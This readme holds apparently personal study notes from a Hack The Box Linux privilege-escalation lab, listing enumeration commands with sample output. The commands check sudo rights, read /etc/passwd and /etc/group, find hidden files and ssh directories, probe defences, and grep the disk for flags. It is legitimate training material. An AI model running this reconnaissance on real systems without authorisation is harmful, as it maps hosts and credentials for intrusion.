readme.md


<a id="orgcf1a027"></a>

## Environment Enumeration

The first and most fundamental question to address is, "What operating system are we dealing with?" Different Linux distributions require distinct enumeration techniques. For example, if you find yourself on a CentOS or Red Hat Enterprise Linux host, your approach may vary compared to a Debian-based system like Ubuntu. Even more exotic systems like FreeBSD, Solaris, HP-UX, or IBM AIX will demand unique commands and tactics.

However, while the specific commands may differ, the principles behind enumeration remain consistent. In this module, we will begin with an Ubuntu target to cover general tactics and techniques. The goal is to develop a comprehensive and repeatable process that can be applied to any Linux

1.  Started with `basic enumeration`
    
        whoami # what user are we running as
        id # what groups does our user belong to?
        hostname #what is the server named. can we gather anything from the naming convention?
        ifconfig or ip -a #what subnet did we land in, does the host have additional NICs in other subnets?
        sudo -l #can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do  something like sudo su and drop right into a root shell.

2.  Cheking out what `operating system and version` wea are dealing with
    
        cat /etc/os-release
        
        NAME="Ubuntu"
        VERSION="20.04.4 LTS (Focal Fossa)" # <-- Version!
        ID=ubuntu
        ID_LIKE=debian
        PRETTY_NAME="Ubuntu 20.04.4 LTS"
        VERSION_ID="20.04"
        HOME_URL="https://www.ubuntu.com/"
        SUPPORT_URL="https://help.ubuntu.com/"
        BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
        PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
        VERSION_CODENAME=focal
        UBUNTU_CODENAME=focal

3.  Check out our current `user's PATH`
    which is where the Linux system looks every time a command is executed for any executables to match the name of
    what we type, i.e., id which on this system is located at /usr/bin/id.
    
        echo $PATH
        
        /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

4.  Check out all `environment variables` that are set for our current user
    
        env
        
        SHELL=/bin/bash
        PWD=/home/htb-student
        LOGNAME=htb-student
        XDG_SESSION_TYPE=tty
        MOTD_SHOWN=pam
        HOME=/home/htb-student
        LANG=en_US.UTF-8

5.  `Kernel versio`
    
        uname -a
        
        Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

6.  `CPU type/version`
    
        lscpu
        
        Architecture:                    x86_64
        CPU op-mode(s):                  32-bit, 64-bit
        Byte Order:                      Little Endian
        Address sizes:                   43 bits physical, 48 bits virtual
        CPU(s):                          2
        On-line CPU(s) list:             0,1
        Thread(s) per core:              1
        Core(s) per socket:              2
        Socket(s):                       1
        NUMA node(s):                    1
        Vendor ID:                       AuthenticAMD
        CPU family:                      23
        Model:                           49
        Model name:                      AMD EPYC 7302P 16-Core Processor
        Stepping:                        0
        CPU MHz:                         2994.375
        BogoMIPS:                        5988.75
        Hypervisor vendor:               VMware

7.  Chek `installed shell`
    
        cat /etc/shells
        
        # /etc/shells: valid login shells
        /bin/sh
        /bin/bash
        /usr/bin/bash
        /bin/rbash
        /usr/bin/rbash
        /bin/dash
        /usr/bin/dash
        /usr/bin/tmux
        /usr/bin/screen

8.  We should also check to see if any `defenses are in place` and we can enumerate any information about them. Some things to look for include:
    -   [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
    -   [iptables](https://linux.die.net/man/8/iptables)
    -   [AppArmor](https://apparmor.net/)
    -   [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
    -   [Fail2ban](https://github.com/fail2ban/fail2ban)
    -   [Snort](https://www.snort.org/faq/what-is-snort)
    -   [Uncomplicated Firewall](https://wiki.ubuntu.com/UncomplicatedFirewall)

9.  Check out the `Routing Table` by typing route or netstat -rn.
    
        route
        
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        default         _gateway        0.0.0.0         UG    0      0        0 ens192
        10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192

10. `Arp Table` to see what other hosts the target has been communicating with.
    
        arp -a
        
        _gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192

11. `User`
    -   **All user**
        
            cat /etc/passwd
            
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            sync:x:4:65534:sync:/bin:/bin/sync
            games:x:5:60:games:/usr/games:/usr/sbin/nologin
            man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
            lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
            mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
            news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
            uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
            proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
            www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
            backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
            list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
            irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
            tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
            mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
            bjones:x:1001:1001::/home/bjones:/bin/sh
            administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
            backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
            cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
            logger:x:1005:1005::/home/logger:/bin/sh
            shared:x:1006:1006::/home/shared:/bin/sh
            stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
            htb-student:x:1008:1008::/home/htb-student:/bin/bash
            <SNIP>
    
    -   **Deep search**
        Occasionally, we will see password hashes directly in the /etc/passwd file. This file is readable by all users,
        and as with hashes in the /etc/shadow file, these can be subjected to an offline password cracking attack. This
        configuration, while not common, can sometimes be seen on embedded devices and routers.
        
            cat /etc/passwd | cut -f1 -d:
            
            root
            daemon
            bin
            sys
            
            ...SNIP...
            
            mrb3n
            lxd
            bjones
            administrator.ilfreight
            backupsvc
            cliff.moore
            logger
            shared
            stacey.jenkins
            htb-student
    
    -   **Users have login shells**
        We'll also want to check which users have login shells. Once we see what shells are on the system, we can check
        each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a
        shellshock exploit.
        
            grep "*sh$" /etc/passwd
            
            root:x:0:0:root:/root:/bin/bash
            mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
            bjones:x:1001:1001::/home/bjones:/bin/sh
            administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
            backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
            cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
            logger:x:1005:1005::/home/logger:/bin/sh
            shared:x:1006:1006::/home/shared:/bin/sh
            stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
            htb-student:x:1008:1008::/home/htb-student:/bin/bash

12. `Existing Groups`
    The /etc/group file lists all of the groups on the system.
    
        cat /etc/group
        
        root:x:0:
        daemon:x:1:
        bin:x:2:
        sys:x:3:
        adm:x:4:syslog,htb-student
        tty:x:5:syslog
        disk:x:6:
        lp:x:7:
        mail:x:8:
        news:x:9:
        uucp:x:10:
        man:x:12:
        proxy:x:13:
        kmem:x:15:
        dialout:x:20:
        fax:x:21:
        voice:x:22:
        cdrom:x:24:htb-student
        floppy:x:25:
        tape:x:26:
        sudo:x:27:mrb3n,htb-student
        audio:x:29:pulse
        dip:x:30:htb-student
        www-data:x:33:
    
    We can then use the getent command to list members of any interesting groups
    
        getent group sudo
        
        sudo:x:27:mrb3n

13. Check all `User` with your home directory
    We do that for search interssetsing file maybe containing valnearble information 
    
        ls /home
        
        administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
        backupsvc                cliff.moore  logger       shared

14. `Mounted File Systems`
    We have to check all file System
    
        df -h
        
        Filesystem      Size  Used Avail Use% Mounted on
        udev            1,9G     0  1,9G   0% /dev
        tmpfs           389M  1,8M  388M   1% /run
        /dev/sda5        20G  7,9G   11G  44% /
        tmpfs           1,9G     0  1,9G   0% /dev/shm
        tmpfs           5,0M  4,0K  5,0M   1% /run/lock
        tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup
        /dev/loop0      128K  128K     0 100% /snap/bare/5
        /dev/loop1       62M   62M     0 100% /snap/core20/1611
        /dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535
        /dev/loop4       55M   55M     0 100% /snap/snap-store/558
        /dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115
        /dev/loop5       47M   47M     0 100% /snap/snapd/16292
        /dev/sda1       511M  4,0K  511M   1% /boot/efi
        tmpfs           389M   24K  389M   1% /run/user/1000
        /dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
        /dev/loop6       50M   50M     0 100% /snap/snapd/17576
        /dev/loop7       64M   64M     0 100% /snap/core20/1695
        /dev/loop8       46M   46M     0 100% /snap/snap-store/599
        /dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119

15. `Unmounted File System`
    When a file system is unmounted, it is no longer accessible by the system.
    Therefore, if we can extend our privileges to the root user, we could mount and read these file systems
    ourselves. Unmounted file systems can be viewed as follows:
    
        cat /etc/fstab | grep -v "#" | column -t
        
        UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
        UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
        /swapfile                                  none       swap  sw                 0  0

16. `All Hidden Artifacts`
    Many folders and files are kept hidden on a Linux system so they are not obvious, and accidental editing is
    prevented. Why such files and folders are kept hidden, there are many more reasons than those mentioned so far.
    Nevertheless, we need to be able to locate all hidden files and folders because they can often contain sensitive
    information, even if we have read-only permissions.
    -   All Hidden `Files`
        
            find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <User>
            
            -rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
            -rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
            -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
            -rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
            -rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
            -rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
            -rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes
    
    -   All Hidden `Directory`
        
            find / -type d -name ".*" -ls 2>/dev/null
            
            
               684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
               790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
               684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache
               790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git
               684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config
               655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local
               524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
               544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
               544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
               524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache
                 1408      2 dr-xr-xr-x   1 htb-student htb-student     2048 Aug 31 09:17 /media/htb-student/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
               280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix
               262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix
               262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix
               280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix
               262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix
               661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
               666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
               657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id

17. `Temporary File`
    Both **/tmp** and **/var/tmp** are used to store data temporarily. However, the key difference is how long the data is
    stored in these file systems. The data retention time for /var/tmp is much longer than that of the /tmp directory.
    
        ls -l /tmp /var/tmp /dev/shm
        
        /dev/shm:
        total 0
        
        /tmp:
        total 52
        -rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
        drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
        drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
        <SNIP>
        drwx------ 2 htb-student htb-student 4096 Nov 28 12:37 tracker-extract-files.1000
        drwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125
        
        /var/tmp:
        total 28
        drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
        drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e

18. `Search text` into all file in file system
    
        * grep -r -l 'HTB{[^}]*}' / 2>/dev/null
        
        * grep -r -l 'HTB{' / 2>/dev/null
        
        find / -type f -print0 | grep -r -l ‘HTB{[^}]*}’ / 2>/dev/null
        
        grep -EoR "HTB\{.*\}" / 2>/dev/null
